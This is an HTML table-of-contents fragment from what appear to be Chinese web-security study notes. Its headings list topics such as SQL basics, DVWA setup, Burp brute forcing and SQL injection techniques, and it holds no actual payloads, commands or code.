href="#%E5%9C%A8HTML%E4%B8%8A%E8%A7%A6%E5%8F%91POST%E8%AF%B7%E6%B1%82"><span class="toc-number">1.6.3.</span> <span class="toc-text">在HTML上触发POST请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">1.6.4.</span> <span class="toc-text">POST请求的处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8ESQL%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">数据库与SQL基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.1.</span> <span class="toc-text">数据库系统基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E7%89%B9%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text">关系型数据库系统特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL"><span class="toc-number">2.3.</span> <span class="toc-text">SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SELECT%E8%AF%AD%E5%8F%A5%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.3.1.</span> <span class="toc-text">SELECT语句——基本查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SELECT%E8%AF%AD%E5%8F%A5%E2%80%94%E2%80%94AND%E5%92%8COR%E8%BF%90%E7%AE%97"><span class="toc-number">2.3.2.</span> <span class="toc-text">SELECT语句——AND和OR运算</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">动态页面的工作原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%A1%B5%E9%9D%A2%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B%E7%90%86%E8%A7%A3%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.1.</span> <span class="toc-text">动态页面工作流程理解——数据查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F"><span class="toc-number">3.1.1.</span> <span class="toc-text">系统登录成功</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%99%BB%E5%BD%95%E5%A4%B1%E8%B4%A5"><span class="toc-number">3.1.2.</span> <span class="toc-text">系统登录失败</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94DVWA"><span class="toc-number">3.2.</span> <span class="toc-text">动态网站搭建——DVWA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Burp%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text">Burp暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Burpsuite%E6%A8%A1%E5%9D%97%E2%80%94%E2%80%94Intruder%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-number">4.1.</span> <span class="toc-text">Burpsuite模块——Intruder模块详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E8%AF%B4%E6%98%8E"><span class="toc-number">4.1.1.</span> <span class="toc-text">模块说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94DVWA"><span class="toc-number">4.1.2.</span> <span class="toc-text">暴力破解——DVWA</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">SQL注入的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E7%9A%84%E8%A7%92%E5%BA%A6%E7%9C%8BSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">从程序编写的角度看SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入的常见场景</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%E5%8A%9F%E8%83%BD"><span class="toc-number">1.2.1.</span> <span class="toc-text">数据查询功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%8A%9F%E8%83%BD"><span class="toc-number">1.2.2.</span> <span class="toc-text">登录功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%B0%86%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9E%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.2.3.</span> <span class="toc-text">程序将错误信息直接返回页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%9F%A5%E8%AF%A2%E6%9D%A1%E4%BB%B6%E8%BF%94%E5%9B%9E%E5%88%A4%E6%96%AD%E7%BB%93%E6%9E%9C"><span class="toc-number">1.2.4.</span> <span class="toc-text">基于查询条件返回判断结果</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%9A%84%E6%8F%92%E5%85%A5%E3%80%81%E4%BF%AE%E6%94%B9%E4%B8%8E%E5%88%A0%E9%99%A4%E5%8A%9F%E8%83%BD"><span class="toc-number">1.2.5.</span> <span class="toc-text">数据的插入、修改与删除功能</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.3.</span> <span class="toc-text">SQL注入的分类</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E6%9F%A5%E6%89%BE%E4%B8%8E%E5%88%A4%E6%96%AD"><span class="toc-number">2.</span> <span class="toc-text">SQL注入点的查找与判断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">SQL注入测试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%AF%E8%83%BD%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text">寻找可能的注入点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%83%BD%E5%8F%96%E5%88%B0%E7%9A%84%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">服务器能取到的用户输入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.2.2.</span> <span class="toc-text">常见的注入点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">SQL注入点的测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.1.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.3.2.</span> <span class="toc-text">构造报错注入语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%BB%93%E6%9E%9C%E5%88%A4%E6%96%AD"><span class="toc-number">2.3.3.</span> <span class="toc-text">报错注入结果判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-number">2.3.4.</span> <span class="toc-text">布尔型盲注语句的构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E5%9E%8B%E7%9B%B2%E6%B3%A8%E8%AF%AD%E5%8F%A5%E6%9E%84%E9%80%A0"><span class="toc-number">2.3.5.</span> <span class="toc-text">时间型盲注语句构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E5%9E%8B%E7%9B%B2%E6%B3%A8%E7%9A%84%E7%BB%93%E6%9E%9C%E5%88%A4%E6%96%AD"><span class="toc-number">2.3.6.</span> <span class="toc-text">时间型盲注的结果判断</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0"><span class="toc-number">3.</span> <span class="toc-text">课堂笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9A%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">扩展：正则表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.3.</span> <span class="toc-text">SQL注入步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AF%B9%E6%9F%90%E4%B8%AA%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%88%86%E4%B8%BA%E5%9B%9B%E4%B8%AA%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.3.1.</span> <span class="toc-text">1.对某个网站进行注入，分为四个步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-MySQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">3.3.2.</span> <span class="toc-text">2.MySQL手工注入的方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-MySQL%E4%B8%AD%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.3.</span> <span class="toc-text">3.MySQL中如何进行对应的注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.4.</span> <span class="toc-text">4.联合查询的流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">3.3.4.1.</span> <span class="toc-text">扩展</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E3%80%81%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.5.</span> <span class="toc-text">5.报错注入、盲注的流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.6.</span> <span class="toc-text">6.盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%EF%BC%9AWindows%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">3.4.</span> <span class="toc-text">扩展：Windows下的命令</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
